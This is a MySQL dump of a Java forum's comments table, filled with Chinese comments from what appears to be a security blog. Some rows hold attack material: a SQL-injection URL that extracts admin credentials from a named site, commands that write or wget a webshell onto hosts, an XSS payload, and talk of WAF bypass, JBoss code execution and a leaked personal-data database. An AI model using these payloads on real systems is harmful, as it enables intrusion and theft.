/*
 Navicat Premium Data Transfer

 Source Server         : localhost
 Source Server Type    : MySQL
 Source Server Version : 50727
 Source Host           : localhost
 Source Database       : javaweb-bbs

 Target Server Type    : MySQL
 Target Server Version : 50727
 File Encoding         : utf-8

 Date: 09/17/2019 13:57:55 PM
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
--  Table structure for `sys_comments`
-- ----------------------------
DROP TABLE IF EXISTS `sys_comments`;
CREATE TABLE `sys_comments` (
  `comment_id` int(9) unsigned NOT NULL AUTO_INCREMENT COMMENT '评论Id',
  `comment_post_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论的文章Id',
  `comment_user_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论的用户Id(未登录的用户Id为0)',
  `comment_author` varchar(16) NOT NULL COMMENT '评论者名称',
  `comment_content` text NOT NULL COMMENT '评论内容',
  `comment_status` smallint(1) NOT NULL DEFAULT '0' COMMENT '评论状态(0:待审核,1:审核通过,2:审核不通过)',
  `comment_date` datetime NOT NULL COMMENT '评论发布时间',
  `comment_parent_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论父级Id',
  `comment_approved` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`comment_id`),
  KEY `comment_post_ID` (`comment_post_id`),
  KEY `comment_approved_date_gmt` (`comment_status`),
  KEY `comment_parent` (`comment_parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=17130 DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `sys_comments`
-- ----------------------------
BEGIN;
INSERT INTO `sys_comments` VALUES ('530', '1041', '0', '啦绯', '出大事了', '1', '2014-04-08 15:44:38', '0', null), ('2', '14', '0', 'AmosKing', '哥们儿（称呼不对也不要介意），你的网站是不是被黑了，我们的WP站点的反正是被黑了，所有文章被篡改，且下面有很多链接，有个就是你的，要不洒家我也不会给你留言。当然我也不知道是不是WP漏洞的问题。希望你看到和我联系一下。谢谢！', '1', '2013-11-27 19:58:47', '0', null), ('3', '14', '1', 'adminxpy', '你的博客地址是都少呢？', '1', '2013-11-27 21:09:13', '2', null), ('4', '122', '0', 'mujj', '园长妹妹来做个链接啊\n<p>80主机</p>\n<p>http://blog.80host.com</p>', '1', '2013-11-28 17:58:07', '0', null), ('5', '122', '1', '园长MM', '好了MM。', '1', '2013-11-28 18:06:22', '4', null), ('32', '326', '0', 'litdg', '霸气。搞出来记得给个邀请码学习学习啊~', '1', '2013-12-18 16:09:21', '0', null), ('27', '271', '0', '叉叉哦哦', '还是喜欢国际化\n<p>还是喜欢过滤器</p>\n<p>一次过滤，终生无忧</p>', '1', '2013-12-14 10:10:17', '0', null), ('28', '86', '0', '小马', 'MongoDb 可连接到  如何获得权限？或者webshell》？', '1', '2013-12-14 21:09:53', '0', null), ('29', '86', '1', '园长MM', 'Mongo好像不能直接写shell哦', '1', '2013-12-17 11:01:51', '28', null), ('30', '271', '1', '园长MM', '直接改Tom猫有点那啥了，加个filter还是不错的。', '1', '2013-12-17 11:03:09', '27', null), ('618', '122', '0', 'depy', '园长美眉\n<p>做个友链啊</p>\n<p>Depy‘s Blog</p>\n<p>http://www.depycode.com</p>\n<p>贵站链接以做好！！美眉</p>', '1', '2014-04-23 21:22:53', '0', null), ('466', '122', '1', '园长MM', '大哥，你网站都打不开。。。。。。。', '1', '2014-03-29 18:46:45', '464', null), ('536', '1045', '0', 'robert', '好像e的还在受影响范围吧。测试要多测试几次才可以。', '1', '2014-04-09 14:26:05', '0', null), ('538', '1045', '0', 'mujj', 'e的是补丁过的，我多次测试了', '1', '2014-04-09 22:48:24', '536', null), ('619', '122', '1', '园长MM', '加上了，mm。', '1', '2014-04-23 21:27:41', '618', null), ('464', '122', '0', 'Yck', '做友链啊！www.hack-yck.com！', '1', '2014-03-28 22:08:43', '0', null), ('454', '112', '0', 'XRumerTest', 'Hello. And Bye.', '1', '2014-03-27 12:40:40', '0', null), ('455', '122', '0', 'z7y', '来个友链啊,园长大人T A T    <a href=\"http://www.z7ys.com/\" rel=\"nofollow\">z7y博客</a>', '1', '2014-03-27 14:22:10', '0', null), ('456', '122', '0', 'asdhmgfd', '&lt;img src=x onerror=&quot;\\u0064ocument.write(&apos;&apos;)\"&gt;', '1', '2014-03-27 16:32:55', '0', null), ('670', '1210', '0', '林熊熊', '又见360漏洞。', '1', '2014-05-02 19:10:17', '0', null), ('51', '122', '0', 'SuperPang', '大宝贝，来做个链接啊~', '1', '2014-01-08 13:57:18', '0', null), ('276', '620', '0', 'wefgod', '牛逼的园长！', '1', '2014-02-15 14:08:15', '0', null), ('152', '588', '0', 'mujj', '各位刚放假的同学们，80host的小霸王学习机上线了 \n<p>超便宜的价格,低延迟的网络,稳定的环境,是新手练手、VPN服务等用途的好机型,机房为北美亚利桑那州和欧盟荷兰,演示IP：198.35.44.254（北美）192.243.126.2(荷兰),付款后手工开通,有控制面板,不提供任何管理服务,可随时迁移节点,迁移后联系客服获取新IP地址. </p>\n<p>￥50 元 /年</p>\n<p>CPU: 单核</p>\n<p>硬盘: 3 GB</p>\n<p>内存: 128 MB</p>\n<p>IP: 1 个IPv4</p>\n<p>每月流量: 300 GB</p>\n<p>免费节点迁移</p>\n<p>额外IP: 不支持</p>\n<p>TUN/TAP: 支持</p>\n<p>RDNS:支持</p>\n<p>仅支持linux系统,windows就不要问了,没有。 </p>\n<p>购买联系QQ：4600897 http://www.80host.com/cloud.html </p>\n<p>注意事项：禁止使用购买VPS主机做免费空间、黑客、BT/PT、恶意压力测试、政治性、垃圾邮件、攻击、恶意发包、病毒/木马散发、端口扫描、版权纠纷、钓鱼、SF游戏发布于网络或者租用给第三方等一切非正常行为。 </p>\n<p>VPN服务只能私用。 </p>\n<p>我方有权利在不通知用户的情况下,对非正常使用或运行的VPS主机实施以下的措施: </p>\n<p>1.清空路由24小时 </p>\n<p>2.停止VPS </p>\n<p>3.删除VPS</p>', '1', '2014-01-27 00:21:01', '0', null), ('604', '1196', '0', 'young', '大牛，入侵求思路，现在拿到权限以后卡住了，能不能提供点建议，方便联系我邮箱或者qq：547778667，谢谢', '1', '2014-04-22 13:17:36', '0', null), ('605', '1196', '1', '园长MM', '都已经拿到权限了...', '1', '2014-04-22 15:10:38', '604', null), ('469', '122', '0', '人生注入点', '园长 小妹 做个友情链接 我已经做好你的了\n<p> 关注你好久了 你太迷人了 大家都说你是女的 真相... Yes No ..</p>', '1', '2014-03-31 06:11:27', '0', null), ('529', '993', '1', '园长MM', '为什么要把小马保存成Png..随便找张图片不行吗？', '1', '2014-04-08 14:32:23', '522', null), ('471', '122', '1', '园长MM', '有妹子出没的地方我就是男的，没妹子的地方我就是女的。', '1', '2014-03-31 10:20:19', '469', null), ('644', '1233', '0', 'depy', '园长，能不能帮我看看我下的一个flex bbs系统源代码，搞了很长时间允许不了？？谢谢阿', '1', '2014-04-28 00:49:32', '0', null), ('647', '1233', '1', '园长MM', '啊？叫什么名字', '1', '2014-04-28 16:07:04', '644', null), ('648', '1233', '0', 'depy', '基于flex的bbx 系统  java写的', '1', '2014-04-28 22:42:13', '647', null), ('522', '993', '0', '陈俊霖', '这个方法过不去啊，把小马保存为png格式，然后把IP改成自己的服务器地址，安全狗拦截了', '1', '2014-04-07 23:19:07', '0', null), ('661', '478', '0', 'mike', 'DEDE站点请问如果过安全狗呢？', '1', '2014-04-30 23:08:50', '0', null), ('662', '478', '0', 'mike', 'DEDECMS站点，请问如何过安全狗呢？', '1', '2014-04-30 23:09:25', '0', null), ('441', '954', '0', 'si', '3Q   winrar不行    用7z是ok的', '1', '2014-03-24 08:54:43', '0', null), ('341', '798', '0', 'HELLO', '楼主我打不开啊，提示Could not find the main class:org.javaweb.dede.ui.MainFrame', '1', '2014-02-28 11:08:05', '0', null), ('342', '798', '1', '园长MM', '文章末尾更新了环境变量配置，看下你的环境变量配置得对不对。', '1', '2014-02-28 11:11:20', '341', null), ('343', '798', '0', 'HELLO', '依然如上述错误提示哦', '1', '2014-02-28 11:44:23', '342', null), ('344', '798', '1', '园长MM', 'JDK7u51:http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html 安装的时候记得把jdk和jre都安装上。然后按照上面的配置方式配置下环境变量。', '1', '2014-02-28 12:03:30', '343', null), ('346', '798', '0', 'HELLO', '检测了一下这个站  www.rrky.com\n<p>本应显示帐密的框内提示以下：</p>\n<p>java.io.IOException: Server returned HTTP response code: 405 for URL: http://www.rrky.com//plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294</p>', '1', '2014-02-28 14:31:02', '344', null), ('347', '798', '1', '园长MM', '看返回结果是安全宝已经拦截了！', '1', '2014-02-28 15:04:41', '346', null), ('348', '798', '0', 'jeary', '加个蜘蛛批量！', '1', '2014-02-28 22:57:34', '0', null), ('440', '954', '1', '园长MM', '我刚看了下压缩包没有问题，建议你换个解压工具试试？', '1', '2014-03-24 00:53:12', '434', null), ('438', '675', '0', '李先生', '你好，请家我QQ，想跟你学习一下。原因我找到了，是_client里面没的设置cookie的原因，我搞定了。', '1', '2014-03-24 00:35:01', '0', null), ('439', '675', '0', '李先生', '你好，请家我QQ285036220，想跟你学习一下。原因我找到了，是_client里面没的设置cookie的原因，我搞定了。', '1', '2014-03-24 00:35:59', '0', null), ('355', '798', '0', '0x12', 'copy code in MainFrame.java\n<p>del package org.javaweb.dede.ui;</p>\n<p>javac MainFrame.java</p>\n<p>java MainFrame</p>', '1', '2014-03-01 19:57:04', '342', null), ('602', '1032', '0', '_none', '不好意思，因为之前没弄过Java，不太清楚里面的一些语法，在网上可以搜到取得该属性的方法：\n<p>getCacheMaxSize()    //Return the maximum size of the cache in KB.</p>\n<p>但确实不知道该怎么在jsp页面中显示、输出，还希望园长能够给出更多的代码，麻烦了。</p>', '1', '2014-04-21 23:43:01', '599', null), ('599', '1032', '1', '园长MM', 'f.get(f.getName());', '1', '2014-04-21 19:22:27', '597', null), ('363', '798', '0', 'aa', '不能暴漏出后台，有啥用', '1', '2014-03-04 17:16:01', '0', null), ('371', '820', '0', '我不告诉你', '园长，你这么牛B 你老婆知道不', '1', '2014-03-05 21:21:15', '0', null), ('428', '122', '1', '园长MM', 'ok了', '1', '2014-03-21 10:07:54', '422', null), ('422', '122', '0', 'Ha.Cker.In', '友链一下又不会死\n<p>链接名称：Ha.Cker.In</p>\n<p>http://ha.cker.in/</p>', '1', '2014-03-21 01:47:48', '0', null), ('597', '1032', '0', '_none', '园长你好：\n<p>        请问一下在测试过程中，先使用属性列举找出了“class.classLoader.resources.dirContext.cacheMaxSize”这个信息，我怎么能够通过一个jsp或是什么方法查看这个cacheMaxSize的值的大小呢？（还是说在这里只能设置，不能查询？）</p>\n<p>        求解，谢谢了。</p>', '1', '2014-04-21 17:29:26', '0', null), ('434', '954', '0', 'si', 'DZ爆破[正式版1.2]+源码.zip\n<p>下载下来 压缩文件损坏, 麻烦博主 发一份邮箱 zhangsec@qq.com</p>\n<p>谢谢!</p>', '1', '2014-03-23 18:03:11', '0', null), ('403', '122', '0', 'bugsec', 'http://www.bugsec.org/\n<p>BugSec关注web安全</p>', '1', '2014-03-15 02:16:54', '0', null), ('395', '807', '0', 'fate', '膜拜园长', '1', '2014-03-13 11:15:07', '0', null), ('167', '588', '0', 'z7y', '我是z7y嘿铲牛，园长狗，我们一起来做嘿铲吧。详询QQ admin@z7ys.com', '1', '2014-02-01 08:14:32', '0', null), ('803', '1269', '0', 'WeirdBird', 'oschina  通过 xml 注入的话， shell 又是如何写入的呢？', '1', '2014-05-12 13:14:37', '0', null), ('807', '1269', '1', '园长MM', '我没写明是oschina，被你发现了。不过这个没法直接写shell的哦。', '1', '2014-05-12 18:06:40', '803', null), ('1360', '122', '0', '御龙', '友情链接啊\n<p>御龙</p>\n<p>http://nmap.cc</p>\n<p>贵站已做。</p>', '1', '2014-05-27 15:28:54', '0', null), ('821', '1269', '1', '园长MM', '你说的是：<a href=\"http://www.wooyun.org/bugs/wooyun-2014-059911\" rel=\"nofollow\">从开源中国的某XXE漏洞到主站shell</a>？这个漏洞不是我提交的，不过测试代码的确是用的oschina一样的。这漏洞并不是那么容易拿shell，如你所说没法直接写shell。不过任意文件读取和目录遍历已经为getshell提供了比较好的前提条件了。', '1', '2014-05-13 10:44:31', '820', null), ('823', '1269', '0', 'WeirdBird', '坐等 公开了', '1', '2014-05-13 10:47:10', '821', null), ('824', '1269', '0', 'WeirdBird', '对了，话说，你百度盘里面的 社工库 分享链接失效了- - ，私密分享下呗，如果可以的话', '1', '2014-05-13 10:53:26', '0', null), ('820', '1269', '0', 'WeirdBird', '是呢， wooyun 上次有 这个 漏洞通告， 所以不明白怎么拿的shell ， 只返回了StringWriter ， 不知道 洞主 是怎么构造的，写的shell  。 话说，一直逛osc ，所以知道是 oschina 的 洞', '1', '2014-05-13 10:19:15', '807', null), ('890', '820', '0', '过客', '园长可以把is.war,这个文件共享一下吗？', '1', '2014-05-16 20:10:27', '0', null), ('3027', '122', '0', 'blankdisk', '园长妹子来做下友链\n<p>名称：blankdisk社区</p>\n<p>地址：http://www.cnio.org</p>', '1', '2014-06-29 18:22:19', '0', null), ('2708', '1300', '0', 'four', '下载不来了啊表格哥', '1', '2014-06-21 10:49:41', '0', null), ('945', '1256', '0', 'neal', 'sql 能正常执行吗', '1', '2014-05-19 10:43:03', '0', null), ('946', '1256', '0', 'neal', '- - 没注意看 执行成了。 很奇怪 为什么 加了注释符号 还能执行呢', '1', '2014-05-19 10:45:53', '945', null), ('953', '820', '1', '园长MM', 'http://ahack.net/is.war', '1', '2014-05-19 16:30:19', '890', null), ('954', '1269', '1', '园长MM', '不知道你说的是哪个呢？？', '1', '2014-05-19 16:31:10', '823', null), ('2721', '1300', '1', '园长MM', 'http://pan.baidu.com/s/1pJG0psB 可以下载吧', '1', '2014-06-21 16:36:48', '2708', null), ('3102', '820', '0', '请教', '楼主，为什么我按图中填写参数后在jboss目录无法下载到is.war呢，是我的使用方法不对吗，请指教，谢谢。', '1', '2014-07-02 17:07:15', '0', null), ('3108', '1239', '0', 'botak', '在jspy这个shell里面写的很详细\n<p>SHELL_NAME = request.getServletPath().substring(request.getServletPath().lastIndexOf(\"/\")+1);</p>\n<p>	String myAbsolutePath = application.getRealPath(request.getServletPath());</p>\n<p>	if (Util.isEmpty(myAbsolutePath)) {//for weblogic</p>\n<p>		SHELL_NAME = request.getServletPath();</p>\n<p>		myAbsolutePath = new File(application.getResource(\"/\").getPath()+SHELL_NAME).toString();</p>\n<p>		SHELL_NAME=request.getContextPath()+SHELL_NAME;</p>\n<p>		WEB_ROOT = new File(application.getResource(\"/\").getPath()).toString();</p>\n<p>	} else {</p>\n<p>		WEB_ROOT = application.getRealPath(\"/\");</p>\n<p>	}</p>', '1', '2014-07-02 18:38:58', '0', null), ('3136', '820', '1', '园长MM', '经常换服务器jar可能有的时候访问不到哦', '1', '2014-07-03 17:14:57', '3102', null), ('3143', '122', '0', '天少', '名称:隐匿\'s Blog\n<p>网址:http://hldhack.com/</p>\n<p>描述: 隐匿\'s Blog-关注网络安全_漏洞发布_资源共享_社会工程学_渗透测试_逆向破解_编程开发_xss跨站</p>\n<p>类型:技术类型博客。</p>\n<p>换下友链。。</p>\n<p>已经回链</p>', '1', '2014-07-04 07:44:02', '0', null), ('3181', '122', '0', '磊磊', '园长，加个友链，贵站已加，O(∩_∩)O', '1', '2014-07-06 08:03:03', '0', null), ('1556', '122', '0', '效率', '你好啊·我想找个师傅愿意有偿服务·不知道大哥您有没时间呢？我的QQ 693669', '1', '2014-05-30 03:36:13', '0', null), ('1640', '1324', '0', 'danmo', '我来收版权费的。。。。。', '1', '2014-05-31 06:45:12', '0', null), ('1659', '798', '0', '橘子', '园长QAQ\n<p>下载地址木有了QAQ</p>', '1', '2014-05-31 14:35:13', '0', null), ('1660', '988', '0', '橘子', '园长QWQ\n<p>貌似度盘的连接都挂了..</p>', '1', '2014-05-31 14:42:34', '0', null), ('1774', '988', '1', '园长MM', '链接暂时更新了，百度不上发破解版。。。链接: http://pan.baidu.com/s/1tlafO 密码: 3k1c', '1', '2014-06-02 20:06:03', '1660', null), ('2183', '122', '0', 'luwikes', '园长，加个友链，贵站已加，O(∩_∩)O\n<p>luwikes</p>\n<p>luwikes.com</p>', '1', '2014-06-11 13:22:51', '0', null), ('2186', '122', '1', '园长MM', '好了MM', '1', '2014-06-11 14:43:58', '2183', null), ('1936', '798', '0', 'xxoo', '园长，求帮助。。\n<p>select pwd from xxx</p>\n<p>就提示406。。任意表也不行啊</p>', '1', '2014-06-06 07:04:39', '0', null), ('1959', '798', '1', '园长MM', '不知你环境', '1', '2014-06-06 18:33:39', '1936', null), ('4033', '122', '1', '园长MM', '搞好了', '1', '2014-07-22 16:39:23', '4019', null), ('4034', '1366', '1', '园长MM', '谢谢~', '1', '2014-07-22 16:39:32', '4031', null), ('4031', '1366', '0', 'linso', '支持园长大大←_←', '1', '2014-07-22 16:17:14', '0', null), ('4085', '122', '0', 'linso', '名称:CSN信息安全协会\n<p>网址:http://www.csn.pw</p>\n<p>描述:专注跨站与无线安全</p>\n<p>类型:信息安全论坛</p>', '1', '2014-07-23 14:09:47', '0', null), ('4245', '1387', '0', 'pt007', 'mu201405.php?m=system&amp;c=echo ^ &gt;test11.php //在当前目录下面生成一句话马 for windows\n<p>news.php?m=system&amp;c=wget http://210.74.XX/igenus/images/suffix/test11.php //当前目录下载一句话马 for linux</p>\n<p>invokeArgs(array($_GET[c],$_GET[id]));</p>\n<p>?&gt;</p>\n<p>http://xx.xx/images/videomail/md.php?m=file_put_contents&amp;c=test11.php&amp;id= //写入一句话马 for linux</p>\n<p>http://xx.xx/images/videomail/md.php?m=file_put_contents&amp;c=test11.php&amp;id= //写入一句话马 for windows</p>', '1', '2014-07-25 00:09:05', '0', null), ('4248', '1387', '0', 'pt007', '支持写入一句话马的版本,见笑了:\n<p>http://mail.bjsasc.com/skins/blue/1.txt</p>', '1', '2014-07-25 00:15:11', '0', null), ('4019', '122', '0', 'xocoder', '名称:xocoder\'s blog\n<p>网址:http://www.xocoder.com</p>\n<p>描述:关注信息安全</p>\n<p>类型:技术类型博客</p>\n<p>换链，已经做好你站的链接。</p>', '1', '2014-07-22 12:08:01', '0', null), ('6561', '1387', '0', 'www.usble.com', '文章不错，学习了', '1', '2014-08-15 20:18:42', '4248', null), ('6578', '1424', '0', 'fox', '大老如果每篇文章都能配有图片说明，就完美了！', '1', '2014-08-16 10:34:36', '0', null), ('6425', '820', '1', '园长MM', '<a href=\"http://pan.baidu.com/s/1EKwVm\" rel=\"nofollow\">iswin.war</a>', '1', '2014-08-12 10:07:41', '6369', null), ('6369', '820', '0', '小菜', '可以百度云，或者稳定连接共享下is.war吗？', '1', '2014-08-11 20:33:07', '0', null), ('8867', '122', '0', 'ss', 'sss', '1', '2014-09-22 14:56:09', '0', null), ('8699', '122', '1', '园长MM', '做好了', '1', '2014-09-21 17:30:55', '8648', null), ('12146', '1611', '0', '刘帅', '园长大牛你博客有时候会打不开额？想来逛逛结果就出错。。555555555555555', '1', '2014-11-30 11:26:17', '0', null), ('6558', '122', '0', 'Lin', '名称:Lin\'s Home\n<p>网址:http://www.cdlin.com/</p>\n<p>描述:学习之心路历程</p>\n<p>类型:半技术半扯淡类型</p>', '1', '2014-08-15 14:50:59', '0', null), ('8648', '122', '0', '心跳', '院长大人  来个友链吧  么么哒  www.debugsec.pw', '1', '2014-09-21 08:55:50', '0', null), ('12167', '820', '0', 'xxx', '谢谢你更新。已下载。可是我测试的时候提示500.\n<p>JBoss Code Execution</p>\n<p>http://xxx:8000/jmx-console/HtmlAdaptor?action=invokeOpByName</p>\n<p>可以加你吗。我Q97149131</p>', '1', '2014-12-02 03:05:42', '12158', null), ('12546', '1495', '0', '橘子', '这广告打的。\n<p>要不你就单纯做个反代</p>\n<p>自己还加广告算什么，</p>', '1', '2014-12-17 20:57:32', '9586', null), ('12158', '820', '1', '园长MM', '百度网盘 真无语，删了我无数次了', '1', '2014-12-01 10:24:30', '12152', null), ('12159', '1611', '1', '园长MM', '不知道是不是DNS的问题，p2j.cn打不开换javaweb.org', '1', '2014-12-01 10:58:19', '12146', null), ('12152', '820', '0', 'bboy', '工具链接失效。可以再重新传一份吗。谢谢', '1', '2014-12-01 01:59:22', '6425', null), ('12469', '122', '1', '园长MM', '已加', '1', '2014-12-13 15:02:34', '12386', null), ('11586', '1512', '0', '马斯特', '谢谢！', '1', '2014-11-06 00:44:20', '11577', null), ('11580', '1530', '0', '汤青松', '哈哈哈啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊反反复复反反复复', '1', '2014-11-05 18:26:56', '0', null), ('11577', '1512', '1', '园长MM', 'Parallels Desktop.', '1', '2014-11-05 16:41:40', '10573', null), ('10573', '1512', '0', '马斯特', '请教下，菜刀是如何在OS X下跑起来的？', '1', '2014-10-15 01:10:30', '0', null), ('11647', '1512', '1', '园长MM', '过些天我共享一个java版的', '1', '2014-11-07 15:40:15', '11586', null), ('12386', '122', '0', '越南邻国诸侯', '博客：http://www.baimaozi.net\n<p>名称：越南邻国诸侯\'sBlog</p>\n<p>贵站链接已添加</p>', '1', '2014-12-11 14:23:40', '0', null), ('12072', '1601', '0', '刘帅', '每次来园长blog我都打击特大。。园长写的高大上的文章我等菜B根本看不懂有木有。。', '1', '2014-11-24 15:41:06', '0', null), ('12073', '1575', '0', '刘帅', '向园长大大致敬。。', '1', '2014-11-24 15:41:37', '0', null), ('12322', '820', '1', '园长MM', '可能是jboss版本比较高吧', '1', '2014-12-07 16:25:31', '12167', null), ('9586', '1495', '0', 'Black_list', '园长大大 谷歌现在要跳板才能打开呢 能不能把 地址 换成https://www.sssis.com/ 这个 也是谷歌 做个这个版本呢？\n<p>麻烦园长大大了</p>', '1', '2014-09-25 13:44:44', '0', null), ('12566', '1627', '1', '园长MM', '山猫师傅，你怎么可以不隐身了呢？', '1', '2014-12-18 15:02:21', '12564', null), ('12563', '1627', '0', 'Mater', '师傅，徒儿来看你了。', '1', '2014-12-18 12:36:12', '0', null), ('12564', '1627', '0', 'Master', '师傅，徒儿来看你了', '1', '2014-12-18 12:36:40', '0', null), ('9620', '1495', '0', 'no', 'Queue strQeueu = new LinkedBlockingQueue();\n<p>                                                                  ^</p>\n<p>d:\\bash.java:17: 错误: 非法的表达式开始</p>\n<p>                Queue strQeueu = new LinkedBlockingQueue();</p>\n<p> ^</p>\n<p>d:\\bash.java:17: 错误: 非法的类型开始</p>\n<p>                Queue strQeueu = new LinkedBlockingQueue();</p>\n<p>  ^</p>\n<p>d:\\bash.java:17: 错误: 需要</p>\n<p>                Queue strQeueu = new LinkedBlockingQueue();</p>\n<p>   ^</p>\n<p>d:\\bash.java:17: 错误: 需要\';\'</p>\n<p>                Queue strQeueu = new LinkedBlockingQueue();</p>', '1', '2014-09-25 16:39:33', '0', null), ('9623', '1495', '1', '园长MM', '需要一个jsoup的jar包', '1', '2014-09-25 17:12:28', '9620', null), ('9644', '1495', '0', 'mu', '园长用的什么高亮插件啊', '1', '2014-09-25 19:21:36', '0', null), ('9648', '1495', '0', '马斯特', '说好的PHP呢……', '1', '2014-09-25 19:41:19', '0', null), ('9651', '122', '0', 'kingx', '交换友链么~', '1', '2014-09-25 19:54:50', '0', null), ('12250', '1617', '0', '刘帅', '汗哒哒，每次来园长blog都是一种打击。。完全看不懂有木有。。55555555555555', '1', '2014-12-05 09:34:11', '0', null), ('10046', '1495', '0', '笑傲江湖哇哈哈', '加下我Q朋友,3087785345\n<p>想找你写工具. 详情加Q细聊.</p>', '1', '2014-09-29 11:20:30', '0', null), ('10090', '1495', '0', '阿斯达', '菜鸟路过！表示这东西不知道咋用？是把上面的内容保存为test.java,然后下载Java运行库？求大神教', '1', '2014-10-01 18:22:25', '0', null), ('10081', '122', '0', '刘帅', '已添加友链，望回复www.666666i.com', '1', '2014-09-30 21:26:54', '0', null), ('10025', '1495', '1', '园长MM', '或许不会错，我给朋友弹的。msf能收到请求呢。', '1', '2014-09-28 10:18:46', '10024', null), ('10353', '1499', '0', 'tmp', '这个我昨天看过了. print \"./decrypt.py   \"\n<p>jenkins里面找不到credentials.xml . 而且加密方式好像也改了.以前是类似这样的hash ,</p>\n<p>          VHWeSi8aTjIHIObYWyNw/4hrqydpYESwI1JWfmBQNdI=</p>\n<p>现在是这样的</p>\n<p>#jbcrypt:$2a$10$DdaWzN64JgUtLdvxWIflcuQu2fgrrMSAMabF5TSrGK5nXitqK9ZMS</p>', '1', '2014-10-09 21:11:33', '10338', null), ('10024', '1495', '0', '乞丐', '你确定试过可以吗？？      payload那，   wget  xxxxxxxxx/shell1 -O /tmp/shell1  | /bin/chmod 777  这里为什么是管道呢？？？  应该是&amp;&amp; 吧。。。。', '1', '2014-09-28 10:05:35', '0', null), ('10068', '1495', '1', '园长MM', '我写的东西能发的都免费，所以还是算了吧。', '1', '2014-09-30 13:11:16', '10046', null), ('10370', '1512', '0', '刘帅', '来逛逛~学习学习', '1', '2014-10-10 13:27:39', '0', null), ('10371', '1499', '1', '园长MM', '不知道了，没搞过。', '1', '2014-10-10 14:06:56', '10353', null), ('10015', '122', '1', '园长MM', 'hi，链接加了', '1', '2014-09-27 22:18:57', '9992', null), ('10016', '122', '1', '园长MM', 'ok了', '1', '2014-09-27 22:19:42', '9993', null), ('10017', '122', '0', 'kingx', 'ID的超链接就是。。', '1', '2014-09-27 23:37:34', '9829', null), ('10014', '1495', '1', '园长MM', '文件名必须是Test.java，否则会报这个错误。', '1', '2014-09-27 22:14:46', '9996', null), ('10147', '1495', '0', '撒旦', 'jsoup的jar包咋安装啊？？', '1', '2014-10-04 14:03:13', '0', null), ('9996', '1495', '0', 'topplers', '装了jsoup，还是出错:\n<p>bashell.java:15: 错误: 类Test是公共的, 应在名为 Test.java 的文件中声明</p>\n<p>public class Test extends Thread{</p>\n<p>       ^</p>\n<p>1 个错误</p>', '1', '2014-09-27 16:23:33', '0', null), ('9993', '122', '0', 'gdd', '内个 。。。 呃。。。  他们都说你是MM ， 我想问问是真的嘛？\n<p>还有，上面的都交换友链了，我也想交换个友链。（牵一下手，又不会怀孕~~  ）   URL： http://gdd.gd   虾米</p>', '1', '2014-09-27 14:43:27', '0', null), ('9992', '122', '0', 'Sud0H4c', '园长MM 换个友链吧\n<p>你的已经做好</p>\n<p>http://fuzzzz.net</p>\n<p>名称：Sudo\'s BloG</p>', '1', '2014-09-27 14:31:06', '0', null), ('10124', '1495', '0', 'jusker', '少年。。。好好学习编程吧', '1', '2014-10-02 23:38:27', '9586', null), ('10129', '122', '1', '园长MM', '帅哥，加好了。', '1', '2014-10-03 15:50:06', '10081', null), ('10339', '122', '1', '园长MM', '好了', '1', '2014-10-09 10:21:14', '10271', null), ('10338', '1499', '1', '园长MM', 'http://serverfault.com/questions/299425/is-jenkins-hudson-ciphered-password-storage-safe\n<p>https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py</p>', '1', '2014-10-09 10:20:08', '10329', null), ('10329', '1499', '0', 'tmp', '在wooyun 的zone里发不了新帖.能帮忙看看jenkins 的password hash 的解密吗?\n<p>Jenkins专有用户的数据存放在JENKINS_HOME/users目录。users目录的结构我就不扯了，你一看就懂。users/xxx(各种用户名)</p>\n<p> xxx目录里面就一个文件config.xml.找到节点，如</p>\n<p>#jbcrypt:$2a$10$DdaWzN64JgUtLdvxWIflcuQu2fgrrMSAMabF5TSrGK5nXitqK9ZMS</p>\n<p>这个是加密过的. 能帮忙看看,弄一个decrypt出来吗?</p>', '1', '2014-10-09 01:40:46', '0', null), ('10271', '122', '0', '隔壁老王', '博客：http://www.evilkill.com/\n<p>名称：Evilkill\'S Blog</p>\n<p>贵站链接已添加</p>', '1', '2014-10-08 02:07:57', '0', null), ('9931', '1495', '0', 'ccccc', '这站是你的? 你是想做广告吗?', '1', '2014-09-26 21:58:16', '9586', null), ('9849', '1387', '0', 'gdd', '已经明白了 是我这边PHP环境配置错误  3Q', '1', '2014-09-26 16:52:23', '0', null), ('9848', '1387', '0', 'gdd', '用了半天 各种错误~~ 求教一下windows 实例~~~', '1', '2014-09-26 16:50:51', '0', null), ('9828', '1495', '1', '园长MM', 'WP SyntaxHighlighter', '1', '2014-09-26 15:10:05', '9644', null), ('9829', '122', '1', '园长MM', 'URL呢', '1', '2014-09-26 15:10:24', '9651', null), ('12834', '122', '0', '安云网', '园长妹纸,求友链，谢啦~~贵站已做~~\n<p>-----------------------------------</p>\n<p>网站名称:安云网</p>\n<p>网址:http://anyun.org/</p>', '1', '2015-01-05 21:34:43', '0', null), ('12847', '1643', '0', 'fate', '酷', '1', '2015-01-06 15:09:18', '0', null), ('14389', '122', '1', '园长MM', '给你加上了，我刚看到消息，好久没上后台了。', '1', '2015-07-24 14:05:30', '14359', null), ('14390', '122', '0', 'cnsolu', '好的  谢谢园长叔叔  偷偷卖个萌', '1', '2015-07-24 14:46:58', '14389', null), ('13983', '122', '0', '天空', '你好，有个jsp的脚本页面开发，调用Jsp一句话服务端。可以帮忙吗？', '1', '2015-04-21 22:59:07', '0', null), ('13979', '1711', '0', '虾米', '楼主又调皮了。。。', '1', '2015-04-20 16:53:06', '0', null), ('13975', '798', '0', '互联网+', '文件删除了？还是漏洞无效了？', '1', '2015-04-20 